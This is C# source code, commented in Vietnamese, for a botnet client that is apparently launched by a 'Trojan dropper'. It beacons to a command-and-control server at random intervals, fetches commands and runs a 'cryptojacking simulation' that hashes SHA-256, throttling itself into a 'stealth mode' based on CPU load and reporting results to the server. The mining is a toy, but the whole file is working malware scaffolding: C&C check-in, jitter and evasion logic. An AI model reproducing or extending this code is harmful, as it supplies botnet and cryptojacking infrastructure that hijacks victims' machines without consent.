using System;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;

// === NÂNG CẤP: Dùng hằng số để tránh lỗi chính tả ===
public static class BotCommands
{
    public const string Cryptojack = "cryptojack";
    public const string Idle = "idle";
}
public class CryptoJackResult
{
    public string BotId { get; set; }
    public long Nonce { get; set; }
    public string Hash { get; set; }
}
public class LogRequest
{
    public string BotId { get; set; }
    public string Message { get; set; }
}

public class Bot
{
    private static string CncServerUrl;
    private static readonly HttpClient client = new HttpClient();
    private static string botId = Guid.NewGuid().ToString();
    private static string currentStatus = BotCommands.Idle;
    private static Random _random = new Random();

    // === NÂNG CẤP: Dùng CancellationTokenSource để quản lý tác vụ nền an toàn ===
    private static CancellationTokenSource _taskCancellationTokenSource;

    static async Task Main(string[] args)
    {
        FileLogger.Initialize();
        if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
        {
            string serverIp = args[0];
            CncServerUrl = $"http://{serverIp}:8000"; // Gán giá trị cho CncServerUrl
            Console.WriteLine($"C&C Server IP received from dropper: {CncServerUrl}");
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("FATAL: C&C Server IP was not provided.");
            Console.WriteLine("This bot must be started by the Trojan dropper to function.");
            Console.ResetColor();
            Console.ReadLine(); // Dừng chương trình lại để người dùng đọc lỗi
            FileLogger.Shutdown();
            return; // Thoát chương trình
        }

        Console.WriteLine($"Bot started with ID: {botId}");

        while (true)
        {
            try
            {
                await CheckIn();
                string command = await GetCommand();
                Console.WriteLine($"Received command: '{command}'");
                await ExecuteCommand(command);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex.Message}");
                Console.ResetColor();
            }

            int jitterMilliseconds = _random.Next(15000, 30001);
            Console.WriteLine($"Waiting for {jitterMilliseconds / 1000}s...");
            await Task.Delay(jitterMilliseconds);
        }
    }
    static async Task SendLogToServerAsync(string message)
    {
        try
        {
            var logRequest = new LogRequest { BotId = botId, Message = message };
            var content = new StringContent(JsonSerializer.Serialize(logRequest), Encoding.UTF8, "application/json");
            // Gửi và không cần chờ phản hồi để tránh làm chậm bot
            _ = client.PostAsync($"{CncServerUrl}/bot/log", content);
        }
        catch
        {
            // Bỏ qua lỗi, vì log không quan trọng bằng việc đào
        }
    }

    static async Task CheckIn()
    {
        var botInfo = new { BotId = botId, Status = currentStatus };
        var content = new StringContent(JsonSerializer.Serialize(botInfo), Encoding.UTF8, "application/json");
        await client.PostAsync($"{CncServerUrl}/bot/checkin", content);
    }

    static async Task<string> GetCommand()
    {
        var responseString = await client.GetStringAsync($"{CncServerUrl}/bot/getcommand?botId={botId}");
        var commandResponse = JsonSerializer.Deserialize<CommandResponse>(responseString, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
        return commandResponse?.command ?? BotCommands.Idle;
    }

    static async Task ExecuteCommand(string command)
    {
        switch (command)
        {
            case BotCommands.Cryptojack:
                if (currentStatus != BotCommands.Cryptojack)
                {
                    StopCurrentTask();
                    currentStatus = BotCommands.Cryptojack;
                    Console.WriteLine("Executing cryptojacking simulation...");

                    _taskCancellationTokenSource = new CancellationTokenSource();
                    // Chạy và chờ tác vụ hoàn thành (hoặc bị hủy)
                    await SimulateCryptoJack(_taskCancellationTokenSource.Token);
                }
                break;

            case BotCommands.Idle:
            default:
                if (currentStatus != BotCommands.Idle)
                {
                    StopCurrentTask();
                    currentStatus = BotCommands.Idle;
                    Console.WriteLine("Switching to idle state.");
                }
                break;
        }
    }

    // === NÂNG CẤP: Hàm helper để hủy tác vụ một cách an toàn ===
    static void StopCurrentTask()
    {
        if (_taskCancellationTokenSource != null && !_taskCancellationTokenSource.IsCancellationRequested)
        {
            Console.WriteLine("Stopping current task...");
            _taskCancellationTokenSource.Cancel();
            _taskCancellationTokenSource.Dispose();
            _taskCancellationTokenSource = null;
        }
    }
    static async Task SendResultToServerAsync(long nonce, string hash)
    {
        try
        {
            var result = new CryptoJackResult
            {
                BotId = botId,
                Nonce = nonce,
                Hash = hash
            };
            var content = new StringContent(JsonSerializer.Serialize(result), Encoding.UTF8, "application/json");
            // Tạo một CancellationTokenSource để đặt timeout
            using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2))) // Timeout sau 2 giây
            {
                // Gửi yêu cầu với CancellationToken
                await client.PostAsync($"{CncServerUrl}/bot/log", content, cts.Token);
            }
        }
        catch (OperationCanceledException)
        {
            // Lỗi này xảy ra khi timeout, đây là điều mong muốn. Bỏ qua.
        }
        catch
        {
            // Bỏ qua các lỗi mạng khác để bot không bị crash
        }
    }

    static Task SimulateCryptoJack(CancellationToken cancellationToken)
    {
        return Task.Run(async () =>
        {
            // Biến này sẽ được chia sẻ giữa bộ cảm biến và vòng lặp chính
            int adaptiveHashesPerBurst = 10000; // Mặc định ở mức cân bằng

            var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            cpuCounter.NextValue();

            _ = Task.Run(async () =>
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    float totalSystemCpuUsage = cpuCounter.NextValue();

                    // === LOGIC THÍCH ỨNG MỚI ===
                    if (totalSystemCpuUsage > 40.0f)
                    {
                        // HỆ THỐNG BẬN -> LÀM VIỆC VỚI LÔ LỚN
                        adaptiveHashesPerBurst = 100000;
                        Console.WriteLine($"[ADAPTIVE] System CPU HIGH -> Aggressive Mode (Burst: {adaptiveHashesPerBurst})");
                    }
                    else
                    {
                        // HỆ THỐNG RẢNH -> LÀM VIỆC VỚI LÔ NHỎ
                        adaptiveHashesPerBurst = 10000; // Tính 500 hash trước khi nghỉ
                        Console.WriteLine($"[ADAPTIVE] System CPU LOW -> Stealth Mode (Burst: {adaptiveHashesPerBurst})");
                    }
                    await Task.Delay(3000, cancellationToken);
                }
            }, cancellationToken);

            // === LOGIC ĐÀO LIÊN TỤC & LÀM VIỆC THEO LÔ ===
            try
            {
                using (SHA256 sha256 = SHA256.Create())
                {
                    int taskNumber = 1;
                    await SendLogToServerAsync("Starting PERSISTENT & ADAPTIVE mining task (Batch-based)...");

                    while (!cancellationToken.IsCancellationRequested)
                    {
                        long nonce = 0;
                        int burstCounter = 0;
                        string mode = adaptiveHashesPerBurst > 50000 ? "AGGRESSIVE" : "STEALTH";
                        await SendLogToServerAsync($"[TASK #{taskNumber}] Starting search... Mode: {mode}");

                        while (!cancellationToken.IsCancellationRequested)
                        {
                            // === PHẦN BỊ THIẾU TRƯỚC ĐÂY ===
                            // 1. Dữ liệu để hash
                            string dataToHash = $"BalancedTask-{taskNumber}-{nonce}";
                            byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));

                            // 2. Chuyển đổi byte array thành chuỗi hex và khai báo 'hashString'
                            var sBuilder = new StringBuilder();
                            for (int i = 0; i < bytes.Length; i++) { sBuilder.Append(bytes[i].ToString("x2")); }
                            string hashString = sBuilder.ToString();
                            // ===================================

                            // Bây giờ, 'hashString' đã tồn tại và có thể sử dụng được
                            if (hashString.StartsWith("000000"))
                            {
                                await SendLogToServerAsync($"!!! [TASK #{taskNumber}] Hash FOUND! Nonce: {nonce}");
                                await SendResultToServerAsync(nonce, hashString);
                                taskNumber++;
                                break;
                            }
                            nonce++;
                            burstCounter++;

                            if (burstCounter >= adaptiveHashesPerBurst)
                            {
                                await Task.Delay(20, cancellationToken);
                                burstCounter = 0;
                            }
                        }
                    }
                }
            }
            catch (OperationCanceledException)
            {
                // Chỉ log khi tác vụ bị hủy bởi lệnh từ server
                Console.WriteLine("Persistent mining task was canceled by C&C server.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"FATAL ERROR in background task: {ex.Message}");
            }
            finally
            {
                // Chỉ khi tác vụ bị hủy thì bot mới quay về idle
                currentStatus = BotCommands.Idle;
                Console.WriteLine("Task stopped. Returning to idle.");
            }
        }, cancellationToken);
    }
}
public static class FileLogger
{
    private static string _logFilePath;
    private static StreamWriter _streamWriter;
    private static TextWriter _originalConsoleOut;

    public static void Initialize(string logFileName = "bot_log.txt")
    {
        // Lưu lại luồng output gốc của Console
        _originalConsoleOut = Console.Out;
        try
        {
            // Lấy đường dẫn an toàn trong thư mục của file exe
            string exePath = AppContext.BaseDirectory;
            _logFilePath = Path.Combine(exePath, logFileName);

            // Mở file với chế độ ghi tiếp (append) và tự động flush
            _streamWriter = new StreamWriter(_logFilePath, true, Encoding.UTF8)
            {
                AutoFlush = true
            };

            // Chuyển hướng output của Console ra file
            Console.SetOut(_streamWriter);
            Console.WriteLine($"\n===== Logger Initialized at {DateTime.Now} =====");
        }
        catch (Exception ex)
        {
            // Nếu có lỗi, in ra luồng output gốc
            Console.SetOut(_originalConsoleOut);
            Console.WriteLine($"FATAL: Could not initialize file logger. Error: {ex.Message}");
        }
    }

    public static void Shutdown()
    {
        Console.WriteLine($"===== Logger Shutdown at {DateTime.Now} =====\n");
        // Đóng file an toàn và trả lại output cho console gốc
        _streamWriter?.Close();
        _streamWriter?.Dispose();
        if (_originalConsoleOut != null)
        {
            Console.SetOut(_originalConsoleOut);
        }
    }

}

public class CommandResponse
{
    public string command { get; set; }
}